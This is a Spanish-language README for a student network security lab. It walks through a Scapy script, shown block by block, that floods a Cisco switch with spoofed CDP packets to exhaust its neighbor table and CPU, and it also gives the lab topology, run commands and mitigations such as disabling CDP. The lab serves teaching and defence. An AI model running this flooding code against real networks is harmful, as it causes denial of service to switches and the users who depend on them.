# Ataque DoS mediante el Protocolo CDP
### Jordy Rosario · Matrícula: 20250737
**Seguridad de Redes 2026-C-2 · ITLA**

---

## 📋 Tabla de Contenido

1. [Objetivo del Laboratorio](#1-objetivo-del-laboratorio)
2. [Objetivo del Script](#2-objetivo-del-script)
   - [Parámetros de Uso](#21-parámetros-de-uso)
   - [Requisitos del Sistema](#22-requisitos-del-sistema)
3. [Funcionamiento del Script](#3-funcionamiento-del-script)
4. [Documentación de la Red](#4-documentación-de-la-red)
   - [Topología](#41-topología)
   - [Tabla de Dispositivos](#42-tabla-de-dispositivos)
5. [Ejecución del Ataque](#5-ejecución-del-ataque)
6. [Capturas de Pantalla](#6-capturas-de-pantalla)
7. [Contramedidas y Mitigación](#7-contramedidas-y-mitigación)
8. [Video Demostrativo](#8-video-demostrativo)
9. [Referencias](#9-referencias)

---

## 1. Objetivo del Laboratorio

El objetivo principal de este laboratorio es **demostrar las vulnerabilidades inherentes al protocolo CDP (Cisco Discovery Protocol)**, un protocolo de Capa 2 que carece completamente de mecanismos de autenticación.

Se busca evidenciar el impacto de un **ataque de Denegación de Servicio (DoS) dirigido al plano de control** de un switch Cisco, observando cómo la inyección masiva de paquetes CDP falsificados puede:

- Desbordar la tabla de vecinos CDP almacenada en RAM.
- Saturar la CPU del switch procesando tramas falsas.
- Degradar o interrumpir el rendimiento normal del equipo.
- Evidenciar los riesgos de dejar protocolos de descubrimiento habilitados en puertos de acceso.

Este laboratorio se realiza íntegramente en un entorno controlado y virtualizado con fines **exclusivamente educativos** dentro del curso de Seguridad de Redes del ITLA.

---

## 2. Objetivo del Script

El script `Attack_DoS_CDP_20250737.py` automatiza la creación e inyección masiva de paquetes CDP maliciosos hacia un switch Cisco de destino.

Utilizando la librería **Scapy**, el código:
- Falsifica continuamente la dirección MAC de origen (`RandMAC()`).
- Genera nombres de dispositivos (`Device ID`) completamente aleatorios de 12 caracteres.
- Construye tramas Ethernet válidas con encapsulación LLC/SNAP requerida por Cisco.
- Envía los paquetes en bucle infinito a la dirección multicast `01:00:0c:cc:cc:cc`.

Esto fuerza al switch a **registrar miles de vecinos CDP inexistentes**, agotando su memoria y CPU.

### 2.1 Parámetros de Uso

```bash
sudo python3 Attack_DoS_CDP_20250737.py [INTERFAZ]
```

| Parámetro | Descripción | Requerido | Ejemplo |
|-----------|-------------|-----------|---------|
| `INTERFAZ` | Nombre de la interfaz de red desde donde se lanza el ataque | No (default: `eth0`) | `eth0`, `eth1` |

**Ejemplos de uso:**
```bash
# Usando la interfaz por defecto (eth0)
sudo python3 Attack_DoS_CDP_20250737.py

# Especificando una interfaz diferente
sudo python3 Attack_DoS_CDP_20250737.py eth1
```

### 2.2 Requisitos del Sistema

| Requisito | Detalle |
|-----------|---------|
| **Sistema Operativo** | Kali Linux (virtualizado en QEMU/PNETLab) |
| **Lenguaje** | Python 3 |
| **Dependencia principal** | `scapy` + módulo `scapy.contrib.cdp` |
| **Privilegios** | `sudo` / `root` obligatorio (raw sockets en Capa 2) |
| **Interfaz de red** | `eth0` (ajustable por argumento) |
| **Entorno de red** | Conectado al mismo segmento L2 que el switch objetivo |

**Instalación de dependencias:**
```bash
pip install scapy
```

---


## 3. Funcionamiento del Script

A continuación se explica el script **bloque por bloque**:

### Bloque 1: Importación de Módulos

```python
import sys
import random
import string
from scapy.all import *
load_contrib('cdp')
```

- `sys`: permite leer argumentos de la línea de comandos (nombre de interfaz).
- `random` y `string`: para generar cadenas alfanuméricas aleatorias.
- `from scapy.all import *`: importa toda la funcionalidad de Scapy, incluyendo `Ether`, `LLC`, `SNAP`, `RandMAC` y `sendp`.
- `load_contrib('cdp')`: carga el módulo CDP de Scapy, que define las clases `CDPv2_HDR`, `CDPMsgDeviceID`, `CDPMsgPortID` y `CDPMsgPlatform`.

---

### Bloque 2: Generación de Nombres Aleatorios

```python
def generar_cadena_aleatoria(longitud):
    letras = string.ascii_letters + string.digits
    return ''.join(random.choice(letras) for _ in range(longitud))
```

- Genera un nombre de dispositivo de 12 caracteres alfanuméricos aleatorios.
- Cada paquete tendrá un `Device ID` diferente, simulando miles de dispositivos Cisco distintos.

---

### Bloque 3: Construcción de la Trama de Capa 2

```python
mac_destino_cdp = "01:00:0c:cc:cc:cc"
mac_origen = RandMAC()
capa_l2 = Ether(dst=mac_destino_cdp, src=mac_origen)
capa_llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=0x00000c, code=0x2000)
```

- `01:00:0c:cc:cc:cc`: dirección MAC multicast reservada por Cisco para CDP. Todo switch Cisco escucha en esta dirección.
- `RandMAC()`: genera una MAC de origen completamente aleatoria en cada iteración, simulando un dispositivo diferente.
- `LLC/SNAP`: encapsulación requerida por el estándar Cisco para tramas CDP. Sin ella el switch ignoraría los paquetes.

---

### Bloque 4: Construcción de la Carga Útil CDP

```python
cdp_cabecera       = CDPv2_HDR(vers=2, ttl=180)
tlv_id_dispositivo = CDPMsgDeviceID(val=nombre_dispositivo)
tlv_id_puerto      = CDPMsgPortID(iface=b"Ethernet0/1")
tlv_plataforma     = CDPMsgPlatform(val=b"Cisco IOS Software IOL")
```

- `CDPv2_HDR(vers=2, ttl=180)`: cabecera CDP versión 2 con TTL de 180 segundos.
- Los campos **TLV** (Type-Length-Value) son los contenedores de información en CDP:
  - `CDPMsgDeviceID`: nombre del vecino falso (aleatorio).
  - `CDPMsgPortID`: interfaz de origen falsa.
  - `CDPMsgPlatform`: plataforma del dispositivo falso.

---

### Bloque 5: Ensamblado y Envío del Paquete

```python
paquete_final = capa_l2 / capa_llc / cdp_cabecera / tlv_id_dispositivo / tlv_id_puerto / tlv_plataforma
sendp(paquete_final, iface=interfaz, verbose=False)
```

- El operador `/` de Scapy apila las capas del paquete de menor a mayor nivel.
- `sendp()`: envía el paquete a nivel de Capa 2 (raw socket), directamente en la interfaz de red especificada, sin pasar por la pila TCP/IP del sistema operativo.
- `verbose=False`: suprime la salida por pantalla para máxima velocidad de envío.

---

### Bloque 6: Bucle de Inyección

```python
while True:
    # ... construir y enviar paquete
```

- El bucle infinito maximiza la tasa de paquetes por segundo.
- Se detiene con `Ctrl+C`, capturado con `KeyboardInterrupt`.

---

## 4. Documentación de la Red

### 4.1 Topología

```
                    ┌─────────────┐
                    │     R1      │ ← Router
                    │ e0/0        │  
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SW1      │ ← Switch Core / Distribución
                    │             │   (Trunk)
                    └──────┬──────┘
                           │ e0/1 → e0/0
                    ┌──────┴──────┐
          ┌─────────┤    SW2      ├─────────┐
          │ e0/3    │             │ e0/1    │ e0/2
          │         └─────────────┘         │
   ┌──────┴──────┐                   ┌──────┴──────┐  ┌─────────────┐
   │ Kali Linux  │                   │    VPC1     │  │    VPC2     │
   │             │                   │             │  │             │
   │             │                   │             │  │             │
   └──────┬──────┘                   └─────────────┘  └─────────────┘
          │ e1
   ┌──────┴──────┐
   │     Net     │ ← Nube (Internet / Red externa (para conexion ssh))
   └─────────────┘
```

>  Ver imagen de topología: `screenshots/topologia.png`

### 4.2 Tabla de Dispositivos

| Dispositivo | Tipo | Interfaz | Rol | Notas |
|-------------|------|----------|-----|-------|
| **R1** | Router IOL | e0/0 | Default Gateway + Servidor DHCP | Conectado a SW1 |
| **SW1** | Switch IOL | e0/0, e0/1 | Switch de Distribución / Core | Ambas interfaces en modo Trunk |
| **SW2** | Switch IOL | e0/0–e0/3 | Switch de Acceso Perimetral | e0/0 Trunk; e0/1–e0/3 Access VLAN 10 |
| **Kali Linux** | VM QEMU | e0 (eth0), e1 | Nodo Atacante | e0 → SW2; e1 → Net |
| **VPC1** | VPC | eth0 | Cliente Legítimo (Víctima A) | Obtiene IP por DHCP |
| **VPC2** | VPC | eth0 | Cliente Legítimo (Víctima B) | Obtiene IP por DHCP |

---

## 5. Ejecución del Ataque

### Paso 1: Preparar el entorno en Kali Linux

```bash
# Verificar interfaz de red
ip addr show eth0

# Instalar dependencias si no están presentes
pip install scapy

# Clonar el repositorio
git clone https://github.com/Jordy513/P1_CDP_DoS_20250737.git
cd Attack_DoS_CDP_20250737
```

### Paso 2: Lanzar el ataque

```bash
sudo python3 Attack_DoS_CDP_20250737.py eth0
```

### Paso 3: Verificar el efecto en SW2 (consola del switch)

```cisco
SW2# show cdp neighbors
```

Verás cómo la tabla se llena rápidamente con cientos de vecinos falsos con nombres y MACs aleatorias.

```cisco
SW2# show processes cpu | include CDP
```

Observa el porcentaje de CPU consumido por el proceso CDP.

### Paso 4: Detener el ataque

```
Ctrl+C
```

---

## 6. Capturas de Pantalla

| # | Archivo | Descripción |
|---|---------|-------------|
| 1 | [01_topologia.png](screenshots/01_topologia.png) | Vista general de la topología en PNETLab con nombre y matrícula visibles |
| 2 | [02_ataque_ejecutandose.png](screenshots/02_ataque_ejecutandose.png) | Terminal de Kali Linux ejecutando el script CDP DoS |
| 3 | [03_sw2_tabla_vecions.png](screenshots/03_sw2_tabla_vecions.png) | Consola de SW2 mostrando `show cdp neighbors` con entradas falsificadas |
| 4 | [04_sw2_estado_memoria.png](screenshots/04_sw2_estado_memoria.png) | Consumo de memoria controlado (`show memory processor statistics`) tras alcanzar el límite máximo de 3,379 vecinos CDP; la CPU y RAM no colapsan debido a la eficiencia del entorno virtualizado. |
| 5 | [05_contramedida_aplicada.png](screenshots/05_contramedida_aplicada.png) | Configuración de `no cdp enable` en la interfaz de acceso |
| 6 | [06_tabla_limpia_post_mitigacion.png](06_tabla_limpia_post_mitigacion.png) | Tabla CDP vacía tras aplicar la contramedida |

>  *Las capturas se encuentran en la carpeta [screenshots](screenshots/README.md) de este repositorio.*

---

## 7. Contramedidas y Mitigación

La defensa principal consiste en **no exponer CDP en puertos que conectan a dispositivos de usuario final**. CDP es un protocolo de administración que solo debe operar entre dispositivos de infraestructura (router-switch, switch-switch).

### Contramedida 1: Deshabilitar CDP por interfaz (Recomendado)

```cisco
SW2# configure terminal
SW2(config)# interface ethernet 0/1
SW2(config-if)# no cdp enable
SW2(config-if)# interface ethernet 0/2
SW2(config-if)# no cdp enable
SW2(config-if)# interface ethernet 0/3
SW2(config-if)# no cdp enable
SW2(config-if)# end
SW2# write memory
```

> **Efecto:** El ASIC del puerto descarta silenciosamente cualquier trama CDP entrante en esas interfaces, protegiendo los recursos de CPU y memoria del switch. Los enlaces trunk entre switches siguen funcionando con CDP activo.

### Contramedida 2: Deshabilitar CDP globalmente

```cisco
SW2# configure terminal
SW2(config)# no cdp run
SW2(config)# end
SW2# write memory
```

> **Efecto:** CDP se deshabilita en todas las interfaces del dispositivo. Útil en switches de acceso sin necesidad de descubrimiento automático. **Desventaja:** pierde visibilidad de la topología desde herramientas de gestión.

### Contramedida 3: Usar LLDP en lugar de CDP

```cisco
SW2(config)# no cdp run
SW2(config)# lldp run
SW2(config)# interface ethernet 0/1
SW2(config-if)# no lldp transmit
SW2(config-if)# no lldp receive
```

> LLDP es el estándar abierto equivalente a CDP (IEEE 802.1AB). Se puede configurar con mayor granularidad.

### Resumen de contramedidas

| Contramedida | Comando | Alcance | Efecto |
|---|---|---|---|
| Deshabilitar CDP por interfaz | `no cdp enable` | Por puerto | Protege puertos de acceso sin afectar trunks |
| Deshabilitar CDP global | `no cdp run` | Todo el switch | Elimina completamente el riesgo, pero pierde visibilidad |
| Control de tasa (Rate Limiting) | `police rate 8000 bps` en policy-map | Por interfaz | Limita el tráfico L2 aunque no elimina el riesgo |
| Port Security | `switchport port-security maximum 1` | Por puerto | Limita MACs aprendidas, mitiga parcialmente el flooding |
| LLDP con restricción | `no lldp transmit / receive` | Por puerto | Estándar abierto con mayor control granular |

---

## 8. Video Demostrativo

🎥 **[Ver demostración en YouTube]([https://youtube.com/enlace_aqui](https://youtu.be/dzmBnKbA7yc))**

**Duración:** X:XX minutos

**Contenido del video:**
- ✅ Topología visible con nombre y matrícula
- ✅ Hora y fecha del sistema visible
- ✅ Cara y voz del autor
- ✅ Ejecución del ataque CDP DoS
- ✅ Verificación del efecto en SW2
- ✅ Aplicación de contramedidas
- ✅ Verificación post-mitigación

---

## 9. Referencias

- Cisco Systems. (2023). *Cisco Discovery Protocol (CDP) Configuration Guide*. https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/cdp/configuration/xe-16/cdp-xe-16-book.html
- Biondi, P. et al. (2024). *Scapy Documentation*. https://scapy.readthedocs.io/en/latest/
- Scapy Contributors. (2024). *Scapy CDP Module*. https://scapy.readthedocs.io/en/latest/api/scapy.contrib.cdp.html
- IEEE. (2016). *IEEE 802.1AB - Link Layer Discovery Protocol (LLDP)*.
- Cisco Systems. (2023). *Cisco IOS Security Configuration Guide: Securing the Data Plane*. https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/sec_data_acl/configuration/xe-16/sec-data-acl-xe-16-book.html
- Troubleshooting y documentación apoyado en Inteligencia Artifical
